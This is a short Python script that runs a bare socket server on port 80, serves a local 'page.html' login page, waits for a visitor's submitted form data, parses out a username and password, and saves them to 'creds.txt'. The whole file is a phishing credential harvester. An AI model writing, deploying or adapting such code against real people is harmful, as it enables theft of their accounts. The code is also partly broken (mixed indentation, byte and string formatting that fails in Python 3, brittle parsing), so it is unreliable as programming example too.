import socket

def createserver():
    s=socket.socket()
    s.bind(('0.0.0.0',80))
    s.listen(1)
    data=b'something'
    resp=b''
    while True:
        con,addr=s.accept()
        i=0
        f=open('page.html','r')
        while(i<54):
            line=f.readline()
            i=i+1
            con.send(b'%s' % line)
            print(i)
        con.close()
        print('getting data ok')
        con,addr=s.accept()
        data=b'something'
        print('Waiting for credentials')
        while data!=b'':
            data=con.recv(100)
	    resp=resp+data
        con.close()
        break
    return str(resp)

def extcreds(resp):
    r=str(resp)
    data=resp.split('=')
    username=str(data[-3][:-9])
    password=str(data[-2][:-12])
    print('username:',username)
    print('password:',password)
    f=open('creds.txt','w+')
    f.write('Username:%s\nPassword:%s' %(username,password))
    f.close()
    print('written to creds.txt')
